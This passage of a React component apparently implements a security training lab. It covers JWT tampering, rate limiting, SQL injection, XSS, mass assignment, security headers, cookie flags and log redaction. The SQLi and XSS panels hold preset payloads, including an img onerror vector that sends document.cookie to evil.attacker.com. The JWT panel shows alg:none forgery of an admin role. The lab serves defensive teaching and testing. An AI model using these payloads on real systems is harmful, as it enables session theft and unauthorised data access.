                    <span className="text-[11px] opacity-80">Privilege escalation attempt</span>
                  </button>

                  <button
                    onClick={() => setJwtExpiredExploit(!jwtExpiredExploit)}
                    className={`p-2.5 rounded border text-left text-xs transition-colors ${
                      jwtExpiredExploit
                        ? 'bg-rose-500/20 border-rose-500/40 text-rose-300'
                        : 'bg-slate-900 border-slate-800 text-slate-400 hover:text-slate-200'
                    }`}
                  >
                    <span className="font-semibold block">Expire: exp claim</span>
                    <span className="text-[11px] opacity-80">Set timestamp in past</span>
                  </button>
                </div>

                {/* Encoded Token Representation */}
                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-xs text-slate-400">
                    <span>Generated Serialized JWT Token</span>
                    <button
                      onClick={() => copyToClipboard(getComputedJwt(), 'jwt')}
                      className="hover:text-white flex items-center gap-1 text-[11px]"
                    >
                      <Copy className="w-3 h-3" />
                      <span>{copiedText === 'jwt' ? 'Copied' : 'Copy Token'}</span>
                    </button>
                  </div>
                  <div className="p-3 bg-slate-950 border border-slate-800 rounded-lg font-mono text-xs text-slate-300 break-all leading-relaxed">
                    <span className="text-rose-400">{btoa(JSON.stringify({ ...jwtHeader, alg: jwtAlgNoneExploit ? 'none' : 'HS256' }))}</span>
                    <span className="text-slate-500">.</span>
                    <span className="text-indigo-400">{btoa(JSON.stringify({ ...jwtPayload, role: jwtRoleExploit ? 'admin' : 'intern', exp: jwtExpiredExploit ? Math.floor(Date.now() / 1000) - 600 : Math.floor(Date.now() / 1000) + 3600 }))}</span>
                    <span className="text-slate-500">.</span>
                    <span className="text-emerald-400">{jwtAlgNoneExploit ? '' : 'k8Yg7T_x9Jp2_Mv1Wz87aB-4kL98cQ1v2s7L4'}</span>
                  </div>
                </div>

                {/* Decoded Claims Preview */}
                <div className="grid grid-cols-2 gap-3 text-xs">
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-slate-500 block mb-1">Header</span>
                    <pre className="text-rose-400 font-mono text-[11px]">
                      {JSON.stringify({ ...jwtHeader, alg: jwtAlgNoneExploit ? 'none' : 'HS256' }, null, 2)}
                    </pre>
                  </div>
                  <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                    <span className="text-slate-500 block mb-1">Payload</span>
                    <pre className="text-indigo-400 font-mono text-[11px]">
                      {JSON.stringify({ ...jwtPayload, role: jwtRoleExploit ? 'admin' : 'intern', exp: jwtExpiredExploit ? Math.floor(Date.now() / 1000) - 600 : Math.floor(Date.now() / 1000) + 3600 }, null, 2)}
                    </pre>
                  </div>
                </div>
              </div>

              <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <h4 className="text-sm font-semibold text-white">Server Verification Verdict</h4>

                <div className="space-y-3">
                  {jwtAlgNoneExploit ? (
                    <div className="p-3.5 bg-rose-500/10 border border-rose-500/40 rounded-lg text-xs text-rose-300">
                      <div className="font-semibold flex items-center gap-1.5 mb-1 text-rose-400">
                        <AlertOctagon className="w-4 h-4" />
                        CRITICAL VULNERABILITY (CWE-347)
                      </div>
                      <p>
                        The token header specifies <code>alg: "none"</code>. If the server does not enforce an algorithm whitelist, attackers can forge any arbitrary claims (e.g. <code>role: "admin"</code>) without holding the private signing key.
                      </p>
                    </div>
                  ) : jwtRoleExploit ? (
                    <div className="p-3.5 bg-amber-500/10 border border-amber-500/40 rounded-lg text-xs text-amber-300">
                      <div className="font-semibold flex items-center gap-1.5 mb-1 text-amber-400">
                        <AlertTriangle className="w-4 h-4" />
                        SIGNATURE MISMATCH BLOCKED
                      </div>
                      <p>
                        The payload role was modified to "admin", but because the secret key is unknown, the HMAC signature verification fails on a properly configured server.
                      </p>
                    </div>
                  ) : jwtExpiredExploit ? (
                    <div className="p-3.5 bg-amber-500/10 border border-amber-500/40 rounded-lg text-xs text-amber-300">
                      <div className="font-semibold flex items-center gap-1.5 mb-1 text-amber-400">
                        <AlertTriangle className="w-4 h-4" />
                        EXPIRED TOKEN REJECTED
                      </div>
                      <p>
                        The <code>exp</code> claim timestamp is in the past. Standard JWT verification libraries reject this with <code>TokenExpiredError</code>.
                      </p>
                    </div>
                  ) : (
                    <div className="p-3.5 bg-emerald-500/10 border border-emerald-500/40 rounded-lg text-xs text-emerald-300">
                      <div className="font-semibold flex items-center gap-1.5 mb-1 text-emerald-400">
                        <CheckCircle2 className="w-4 h-4" />
                        VALID SIGNED JWT TOKEN
                      </div>
                      <p>
                        Standard token signed with HS256 and valid expiration claim. All security checks pass.
                      </p>
                    </div>
                  )}
                </div>

                <button
                  onClick={() => {
                    if (onRecordEvidence) {
                      onRecordEvidence(
                        'AUTH-05',
                        `Tested JWT token parser against alg:none bypass and signature tampering. Discovered vulnerable endpoints must enforce algorithms: ['HS256'] whitelist.`
                      );
                    }
                  }}
                  className="w-full mt-4 py-2 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5"
                >
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Attach Test Evidence to AUTH-05</span>
                </button>
              </div>
            </div>
          )}

          {authSubTab === 'bruteforce' && (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
                <div>
                  <h3 className="text-base font-semibold text-white">Brute Force & Rate Limit Throttling Lab</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Simulate rapid credential stuffing attempts. Verify that defensive sliding-window rate limiters trigger HTTP 429 Too Many Requests and account lockouts.
                  </p>
                </div>

                <div className="bg-slate-950 border border-slate-800 rounded-lg p-4 space-y-3">
                  <div className="flex items-center justify-between text-xs">
                    <span className="text-slate-400">Consecutive Failed Attempts:</span>
                    <span className="font-mono font-bold text-white tabular-nums">{failedAttempts} / 5</span>
                  </div>

                  <div className="w-full bg-slate-800 rounded-full h-2.5 overflow-hidden">
                    <div
                      className={`h-full transition-all duration-300 ${
                        failedAttempts >= 5 ? 'bg-rose-500' : failedAttempts >= 3 ? 'bg-amber-500' : 'bg-indigo-500'
                      }`}
                      style={{ width: `${Math.min(100, (failedAttempts / 5) * 100)}%` }}
                    />
                  </div>

                  {isLockedOut ? (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Lock className="w-4 h-4 text-rose-400 shrink-0" />
                        <span>HTTP 429: Rate Limit Triggered. Account temporarily locked out.</span>
                      </div>
                      <span className="font-mono font-bold text-white tabular-nums">{lockoutTimer}s remaining</span>
                    </div>
                  ) : (
                    <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-xs text-emerald-300 flex items-center gap-2">
                      <Unlock className="w-4 h-4 text-emerald-400 shrink-0" />
                      <span>Endpoint accepting authentication attempts normally.</span>
                    </div>
                  )}
                </div>

                <div className="flex gap-3">
                  <button
                    disabled={isLockedOut}
                    onClick={handleSimulatedFailedLogin}
                    className="flex-1 py-2.5 bg-rose-600 hover:bg-rose-500 disabled:bg-slate-800 disabled:text-slate-600 text-white rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-2"
                  >
                    <AlertTriangle className="w-4 h-4" />
                    <span>Send Failed Login Request</span>
                  </button>

                  <button
                    onClick={() => {
                      setFailedAttempts(0);
                      setIsLockedOut(false);
                      setLockoutTimer(0);
                    }}
                    className="px-4 py-2.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
                  >
                    <RotateCcw className="w-3.5 h-3.5" />
                    <span>Reset</span>
                  </button>
                </div>
              </div>

              <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <h4 className="text-sm font-semibold text-white">Rate Limiter Audit Metrics</h4>
                <div className="space-y-2 text-xs text-slate-300">
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800 flex justify-between">
                    <span>Threshold Limit</span>
                    <span className="font-mono text-white">5 requests / 15 mins</span>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800 flex justify-between">
                    <span>Backoff Strategy</span>
                    <span className="font-mono text-white">Exponential Backoff</span>
                  </div>
                  <div className="p-2.5 bg-slate-950 rounded border border-slate-800 flex justify-between">
                    <span>IP / Account Fingerprint</span>
                    <span className="font-mono text-white">X-Forwarded-For + User ID</span>
                  </div>
                </div>

                <button
                  onClick={() => {
                    if (onRecordEvidence) {
                      onRecordEvidence(
                        'AUTH-03',
                        `Simulated brute force attacks. Rate limiter successfully triggered HTTP 429 after 5 failed attempts with exponential backoff delay.`
                      );
                    }
                  }}
                  className="w-full mt-4 py-2 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5"
                >
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Attach Test Evidence to AUTH-03</span>
                </button>
              </div>
            </div>
          )}
        </div>
      )}

      {/* ---------------- MODULE 2: INPUT VALIDATION ---------------- */}
      {activeModule === 'input_validation' && (
        <div className="space-y-6">
          <div className="flex items-center gap-2 border-b border-slate-800 pb-3">
            {[
              { id: 'sqli', label: 'SQL Injection: Concatenation vs Parameterization' },
              { id: 'xss', label: 'XSS Sanitization & HTML Entity Encoding' },
              { id: 'schema', label: 'Schema Allowlist & Mass Assignment Defense' },
            ].map((sub) => (
              <button
                key={sub.id}
                onClick={() => setInputSubTab(sub.id as any)}
                className={`px-3 py-1.5 text-xs font-medium rounded-md transition-colors ${
                  inputSubTab === sub.id
                    ? 'bg-slate-800 text-indigo-300 border border-slate-700'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
                }`}
              >
                {sub.label}
              </button>
            ))}
          </div>

          {inputSubTab === 'sqli' && (
            <div className="space-y-6">
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <div>
                  <h3 className="text-base font-semibold text-white">SQL Injection (SQLi) Prevention Sandbox</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Compare how vulnerable string interpolation breaks SQL command logic versus how parameterized queries treat input strictly as scalar literal data.
                  </p>
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-300">Untrusted User Input Parameter</label>
                  <input
                    type="text"
                    value={sqliInput}
                    onChange={(e) => setSqliInput(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3.5 py-2 text-sm text-white font-mono focus:outline-none focus:border-indigo-500"
                  />
                  <div className="flex flex-wrap gap-2 pt-1 text-xs">
                    <span className="text-slate-500">Test Injections:</span>
                    {[
                      { label: "Tautology (' OR 1=1 --)", val: "' OR 1=1 --" },
                      { label: "Admin Bypass (' OR 'admin'='admin')", val: "' OR 'admin'='admin' --" },
                      { label: "UNION Exploit (' UNION SELECT ...)", val: "' UNION SELECT 1, 'hacked', 'root@dark.net', true --" },
                      { label: 'Benign String (alex.intern)', val: 'alex.intern' },
                    ].map((p, idx) => (
                      <button
                        key={idx}
                        onClick={() => setSqliInput(p.val)}
                        className="px-2 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700/60"
                      >
                        {p.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* Comparison Grid */}
                <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 pt-2">
                  {/* Vulnerable side */}
                  <div className="bg-slate-950 border border-rose-500/30 rounded-xl p-4 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-semibold text-rose-400 flex items-center gap-1.5">
                        <XCircle className="w-4 h-4" /> ❌ Vulnerable String Interpolation
                      </span>
                      <span className="text-[11px] text-slate-500">CWE-89 / OWASP A03</span>
                    </div>

                    <pre className="p-3 bg-slate-900 rounded-lg text-xs font-mono text-slate-300 whitespace-pre-wrap break-all border border-slate-800">
                      {vulnerableSqlQuery}
                    </pre>

                    <div className="p-3 rounded-lg text-xs bg-rose-500/10 border border-rose-500/20 text-rose-300 space-y-1">
                      <div className="font-semibold text-rose-400">Analysis:</div>
                      {isSqliExploited ? (
                        <p>
                          CRITICAL: The single-quote terminates the literal string! The <code>OR 1=1</code> clause forces the condition to always evaluate to <code>TRUE</code>, leaking all database user records without authentication!
                        </p>
                      ) : (
                        <p>No active exploit detected in this payload, but the query remains fundamentally vulnerable to syntax breaking.</p>
                      )}
                    </div>
                  </div>

                  {/* Secure Parameterized side */}
                  <div className="bg-slate-950 border border-emerald-500/30 rounded-xl p-4 space-y-3">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-semibold text-emerald-400 flex items-center gap-1.5">
                        <CheckCircle2 className="w-4 h-4" /> ✅ Prepared Statement & Parameters
                      </span>
                      <span className="text-[11px] text-slate-500">NIST SP 800-53 / ASVS V5.2</span>
                    </div>

                    <pre className="p-3 bg-slate-900 rounded-lg text-xs font-mono text-slate-300 whitespace-pre-wrap break-all border border-slate-800">
                      {safeSqlQuery}
                    </pre>

                    <div className="p-3 rounded-lg text-xs bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 space-y-1">
                      <div className="font-semibold text-emerald-400">Analysis:</div>
                      <p>
                        SECURE: The database driver compiles the SQL Abstract Syntax Tree (AST) before values are bound. The input string is treated solely as literal characters. Injection characters are neutralised.
                      </p>
                    </div>
                  </div>
                </div>

                <div className="pt-2">
                  <button
                    onClick={() => {
                      if (onRecordEvidence) {
                        onRecordEvidence(
                          'INPUT-01',
                          `Tested SQL injection sandbox with payload "${sqliInput}". Verified that parameterized prepared statements prevent tautology bypass attacks.`
                        );
                      }
                    }}
                    className="py-2 px-4 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Attach Test Evidence to INPUT-01 Checklist</span>
                  </button>
                </div>
              </div>
            </div>
          )}

          {inputSubTab === 'xss' && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
              <div>
                <h3 className="text-base font-semibold text-white">Cross-Site Scripting (XSS) Sanitization Playground</h3>
                <p className="text-xs text-slate-400 mt-1">
                  Test malicious JavaScript script injection payloads. Observe the contrast between unsafe DOM reflection and context-aware HTML entity encoding.
                </p>
              </div>

              <div className="space-y-2">
                <label className="text-xs font-medium text-slate-300">Test XSS Payload</label>
                <input
                  type="text"
                  value={xssInput}
                  onChange={(e) => setXssInput(e.target.value)}
                  className="w-full bg-slate-950 border border-slate-800 rounded-lg px-3.5 py-2 text-sm text-white font-mono focus:outline-none focus:border-indigo-500"
                />
                <div className="flex flex-wrap gap-2 pt-1 text-xs">
                  <span className="text-slate-500">Presets:</span>
                  {[
                    { label: 'Script Tag Injection', val: "<script>alert('Session stolen: ' + document.cookie)</script>" },
                    { label: 'Image OnError Vector', val: "<img src='x' onerror=\"fetch('https://evil.attacker.com/steal?c='+document.cookie)\" />" },
                    { label: 'SVG OnLoad Vector', val: "<svg onload=\"alert('SVG XSS')\" />" },
                    { label: 'Safe Markdown Text', val: "Hello, this is regular **bold** text." },
                  ].map((p, idx) => (
                    <button
                      key={idx}
                      onClick={() => setXssInput(p.val)}
                      className="px-2 py-0.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700/60"
                    >
                      {p.label}
                    </button>
                  ))}
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="bg-slate-950 border border-rose-500/30 rounded-xl p-4 space-y-2">
                  <span className="text-xs font-semibold text-rose-400">❌ Unsanitized / Raw DOM Reflection Hazard</span>
                  <div className="p-3 bg-slate-900 rounded border border-slate-800 font-mono text-xs text-rose-300 break-all">
                    {xssInput}
                  </div>
                  <p className="text-xs text-slate-400">
                    If passed to <code>innerHTML</code>, the browser executes the script immediately in the victim's session context, permitting session token theft.
                  </p>
                </div>

                <div className="bg-slate-950 border border-emerald-500/30 rounded-xl p-4 space-y-2">
                  <span className="text-xs font-semibold text-emerald-400">✅ Context-Aware HTML Entity Encoded Output</span>
                  <div className="p-3 bg-slate-900 rounded border border-slate-800 font-mono text-xs text-emerald-300 break-all">
                    {escapeHtmlEntities(xssInput)}
                  </div>
                  <p className="text-xs text-slate-400">
                    The browser renders the tags harmlessly as visible text on the page without interpreting them as executable markup.
                  </p>
                </div>
              </div>

              <button
                onClick={() => {
                  if (onRecordEvidence) {
                    onRecordEvidence(
                      'INPUT-02',
                      `Demonstrated XSS attack payloads in sandbox. Confirmed HTML entity encoding safely neutralizes script tags and inline event handlers.`
                    );
                  }
                }}
                className="py-2 px-4 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
              >
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Attach Test Evidence to INPUT-02</span>
              </button>
            </div>
          )}

          {inputSubTab === 'schema' && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
              <div>
                <h3 className="text-base font-semibold text-white">Schema Allowlist & Mass Assignment Defense</h3>
                <p className="text-xs text-slate-400 mt-1">
                  Enforce strict schema validation rules. Strip unexpected client-supplied parameters that could overwrite administrative flags.
                </p>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-slate-300">Incoming JSON Request Body</label>
                  <textarea
                    rows={8}
                    value={schemaInputJson}
                    onChange={(e) => setSchemaInputJson(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 font-mono text-xs text-white focus:outline-none focus:border-indigo-500"
                  />
                </div>

                <div className="bg-slate-950 border border-slate-800 rounded-lg p-4 space-y-3">
                  <h4 className="text-xs font-semibold text-white">Strict Allowlist Filter (Allowed: fullName, email, phone)</h4>
                  {schemaValidationResult.valid ? (
                    <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-xs text-emerald-300">
                      <div className="font-semibold flex items-center gap-1.5 mb-1">
                        <CheckCircle2 className="w-4 h-4" /> Schema Valid
                      </div>
                      <p>All supplied properties match the allowed user profile schema.</p>
                    </div>
                  ) : schemaValidationResult.error ? (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300">
                      {schemaValidationResult.error}
                    </div>
                  ) : (
                    <div className="p-3 bg-rose-500/10 border border-rose-500/30 rounded-lg text-xs text-rose-300 space-y-2">
                      <div className="font-semibold flex items-center gap-1.5 text-rose-400">
                        <AlertOctagon className="w-4 h-4" /> Mass Assignment Attempt Detected!
                      </div>
                      <p>
                        The payload contained unauthorized fields not permitted by the API schema:
                      </p>
                      <div className="flex flex-wrap gap-1.5 pt-1">
                        {schemaValidationResult.strippedKeys.map((k) => (
                          <span key={k} className="px-2 py-0.5 bg-rose-500/20 text-rose-300 rounded font-mono text-[11px]">
                            {k}
                          </span>
                        ))}
                      </div>
                      <p className="text-[11px] text-slate-400 pt-1">
                        Defensive Action: Server drops unauthorized fields or returns HTTP 422 Unprocessable Entity.
                      </p>
                    </div>
                  )}
                </div>
              </div>

              <button
                onClick={() => {
                  if (onRecordEvidence) {
                    onRecordEvidence(
                      'INPUT-03',
                      `Tested schema validator against mass assignment. Successfully detected and rejected injected administrative keys.`
                    );
                  }
                }}
                className="py-2 px-4 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
              >
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Attach Test Evidence to INPUT-03</span>
              </button>
            </div>
          )}
        </div>
      )}

      {/* ---------------- MODULE 3: SECURITY CHECKS ---------------- */}
      {activeModule === 'security_checks' && (
        <div className="space-y-6">
          <div className="flex items-center gap-2 border-b border-slate-800 pb-3">
            {[
              { id: 'headers', label: 'HTTP Security Headers Evaluator' },
              { id: 'cookies', label: 'Cookie Security Attributes (HttpOnly & Secure)' },
            ].map((sub) => (
              <button
                key={sub.id}
                onClick={() => setSecSubTab(sub.id as any)}
                className={`px-3 py-1.5 text-xs font-medium rounded-md transition-colors ${
                  secSubTab === sub.id
                    ? 'bg-slate-800 text-indigo-300 border border-slate-700'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
                }`}
              >
                {sub.label}
              </button>
            ))}
          </div>

          {secSubTab === 'headers' && (
            <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
              <div className="lg:col-span-7 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-4">
                <div className="flex items-center justify-between">
                  <div>
                    <h3 className="text-base font-semibold text-white">HTTP Security Headers Inspector</h3>
                    <p className="text-xs text-slate-400 mt-1">
                      Audit defensive HTTP response headers against OWASP Secure Headers guidelines.
                    </p>
                  </div>
                  <div className="flex gap-2">
                    <button
                      onClick={() => setCustomHeaders(presetHeaderConfigs.vulnerable)}
                      className="px-2.5 py-1 text-xs bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700"
                    >
                      Load Vulnerable
                    </button>
                    <button
                      onClick={() => setCustomHeaders(presetHeaderConfigs.hardened)}
                      className="px-2.5 py-1 text-xs bg-indigo-600/30 hover:bg-indigo-600/40 text-indigo-300 rounded border border-indigo-500/30"
                    >
                      Load Hardened
                    </button>
                  </div>
                </div>

                <div className="space-y-3">
                  {Object.keys(presetHeaderConfigs.hardened).map((headerName) => (
                    <div key={headerName} className="space-y-1">
                      <div className="flex items-center justify-between text-xs">
                        <span className="font-mono text-indigo-300">{headerName}</span>
                        {customHeaders[headerName] ? (
                          <span className="text-emerald-400 font-semibold text-[11px]">Configured</span>
                        ) : (
                          <span className="text-rose-400 font-semibold text-[11px]">Missing</span>
                        )}
                      </div>
                      <input
                        type="text"
                        value={customHeaders[headerName] || ''}
                        onChange={(e) =>
                          setCustomHeaders({
                            ...customHeaders,
                            [headerName]: e.target.value,
                          })
                        }
                        placeholder={`Set ${headerName}...`}
                        className="w-full bg-slate-950 border border-slate-800 rounded px-3 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-indigo-500"
                      />
                    </div>
                  ))}
                </div>
              </div>

              <div className="lg:col-span-5 bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
                <h4 className="text-sm font-semibold text-white">Header Security Posture Grade</h4>

                <div className="flex items-center gap-4 bg-slate-950 p-4 rounded-xl border border-slate-800">
                  <div
                    className={`w-16 h-16 rounded-xl flex items-center justify-center text-2xl font-black font-mono border ${
                      headerAudit.score >= 80
                        ? 'bg-emerald-500/10 border-emerald-500/40 text-emerald-400'
                        : headerAudit.score >= 50
                        ? 'bg-amber-500/10 border-amber-500/40 text-amber-400'
                        : 'bg-rose-500/10 border-rose-500/40 text-rose-400'
                    }`}
                  >
                    {headerAudit.grade}
                  </div>
                  <div>
                    <span className="text-xs text-slate-500 block">Posture Score</span>
                    <span className="text-xl font-bold font-mono text-white tabular-nums">{headerAudit.score} / 100</span>
                  </div>
                </div>

                <div className="space-y-2">
                  <span className="text-xs font-semibold text-slate-300">Auditor Observations:</span>
                  {headerAudit.deductions.length === 0 ? (
                    <div className="p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg text-xs text-emerald-300">
                      All critical defense headers configured to highest standard!
                    </div>
                  ) : (
                    <div className="space-y-1.5">
                      {headerAudit.deductions.map((d, idx) => (
                        <div key={idx} className="p-2 bg-slate-950 rounded text-xs text-rose-300 border border-slate-800 flex items-start gap-1.5">
                          <AlertTriangle className="w-3.5 h-3.5 text-rose-400 shrink-0 mt-0.5" />
                          <span>{d}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>

                <button
                  onClick={() => {
                    if (onRecordEvidence) {
                      onRecordEvidence(
                        'SEC-01',
                        `Evaluated server response headers. Current score: ${headerAudit.score}/100 (Grade ${headerAudit.grade}). Missing headers require Helmet middleware deployment.`
                      );
                    }
                  }}
                  className="w-full py-2 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center justify-center gap-1.5"
                >
                  <CheckCircle2 className="w-3.5 h-3.5" />
                  <span>Attach Test Evidence to SEC-01</span>
                </button>
              </div>
            </div>
          )}

          {secSubTab === 'cookies' && (
            <div className="bg-slate-900 border border-slate-800 rounded-xl p-5 space-y-5">
              <div>
                <h3 className="text-base font-semibold text-white">Cookie Security Attributes Inspector</h3>
                <p className="text-xs text-slate-400 mt-1">
                  Verify critical protection flags: <code>HttpOnly</code> against XSS script access, <code>Secure</code> against cleartext sniffing, and <code>SameSite</code> against CSRF.
                </p>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                <div className="bg-slate-950 border border-slate-800 p-4 rounded-xl space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-white">HttpOnly Flag</span>
                    <input
                      type="checkbox"
                      checked={cookieHttpOnly}
                      onChange={(e) => setCookieHttpOnly(e.target.checked)}
                      className="w-4 h-4 rounded text-indigo-600"
                    />
                  </div>
                  <p className="text-[11px] text-slate-400">
                    Blocks <code>document.cookie</code> reading from JavaScript, preventing session token theft if XSS occurs.
                  </p>
                </div>

                <div className="bg-slate-950 border border-slate-800 p-4 rounded-xl space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-white">Secure Flag</span>
                    <input
                      type="checkbox"
                      checked={cookieSecure}
                      onChange={(e) => setCookieSecure(e.target.checked)}
                      className="w-4 h-4 rounded text-indigo-600"
                    />
                  </div>
                  <p className="text-[11px] text-slate-400">
                    Restricts cookie transmission strictly over TLS encrypted HTTPS connections.
                  </p>
                </div>

                <div className="bg-slate-950 border border-slate-800 p-4 rounded-xl space-y-2">
                  <div className="flex items-center justify-between">
                    <span className="text-xs font-semibold text-white">SameSite</span>
                    <select
                      value={cookieSameSite}
                      onChange={(e) => setCookieSameSite(e.target.value as any)}
                      className="bg-slate-900 border border-slate-700 rounded px-2 py-1 text-xs text-white"
                    >
                      <option value="None">None (Vulnerable)</option>
                      <option value="Lax">Lax (Default)</option>
                      <option value="Strict">Strict (Maximum)</option>
                    </select>
                  </div>
                  <p className="text-[11px] text-slate-400">
                    Prevents cross-site request forgery attacks by controlling cookie attachment to third-party origin requests.
                  </p>
                </div>
              </div>

              <div className="p-4 bg-slate-950 border border-slate-800 rounded-xl space-y-2 font-mono text-xs">
                <span className="text-slate-500 block text-[11px]">Resulting Set-Cookie Header:</span>
                <span className="text-indigo-300">
                  Set-Cookie: session_id=s%3A89fa9d1b; Path=/; {cookieHttpOnly ? 'HttpOnly; ' : ''}{cookieSecure ? 'Secure; ' : ''}SameSite={cookieSameSite}
                </span>
              </div>

              <button
                onClick={() => {
                  if (onRecordEvidence) {
                    onRecordEvidence(
                      'SEC-05',
                      `Audited cookie flags. Confirmed session cookie enforces HttpOnly, Secure, and SameSite=Strict attributes.`
                    );
                  }
                }}
                className="py-2 px-4 bg-indigo-600/20 hover:bg-indigo-600/30 text-indigo-300 border border-indigo-500/30 rounded-lg text-xs font-semibold transition-colors flex items-center gap-1.5"
              >
                <CheckCircle2 className="w-3.5 h-3.5" />
                <span>Attach Test Evidence to SEC-05</span>
              </button>
            </div>
          )}
        </div>
      )}

      {/* ---------------- MODULE 4: LOGGING ---------------- */}
      {activeModule === 'logging' && (
        <div className="space-y-6">
          <div className="flex items-center gap-2 border-b border-slate-800 pb-3">
            {[
              { id: 'redaction', label: 'Live PII & Credential Log Sanitizer' },
              { id: 'event', label: 'Structured Security Audit Trail Event Generator' },
            ].map((sub) => (
              <button
                key={sub.id}
                onClick={() => setLogSubTab(sub.id as any)}
                className={`px-3 py-1.5 text-xs font-medium rounded-md transition-colors ${
                  logSubTab === sub.id
                    ? 'bg-slate-800 text-indigo-300 border border-slate-700'
                    : 'text-slate-400 hover:text-slate-200 hover:bg-slate-800/40'
                }`}
              >
                {sub.label}
              </button>
            ))}
          </div>

          {logSubTab === 'redaction' && (
            <div className="space-y-5 bg-slate-900 border border-slate-800 rounded-xl p-5">
              <div className="flex items-center justify-between flex-wrap gap-2">
                <div>
                  <h3 className="text-base font-semibold text-white">Live PII & Credential Log Sanitizer</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Detect and mask sensitive data (passwords, card numbers, API keys, tokens, SSNs) before serialization to prevent log leakage vulnerabilities (CWE-532).
                  </p>
                </div>
                <div className="flex items-center gap-2">
                  <span className="text-xs px-2.5 py-1 bg-rose-500/20 border border-rose-500/30 text-rose-300 rounded font-semibold">
                    {detectedViolationsCount} Secret Leaks Detected
                  </span>
                  <button
                    onClick={() => setRawLogs(defaultLogSample)}
                    className="text-xs px-2 py-1 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded border border-slate-700"
                  >
                    Reset Sample
                  </button>
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <label className="text-xs font-medium text-rose-300 flex items-center gap-1.5">
                    <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
                    <span>Raw Incoming Application Log Stream (Unsanitized)</span>
                  </label>
                  <textarea
                    rows={9}
                    value={rawLogs}
                    onChange={(e) => setRawLogs(e.target.value)}
                    className="w-full bg-slate-950 border border-rose-500/30 rounded-lg p-3 font-mono text-xs text-rose-200/90 focus:outline-none focus:border-rose-500"
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-xs font-medium text-emerald-300 flex items-center gap-1.5">
                    <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                    <span>Sanitized & Redacted Log Stream (GDPR & PCI-DSS Compliant)</span>
                  </label>
                  <textarea
                    readOnly
                    rows={9}
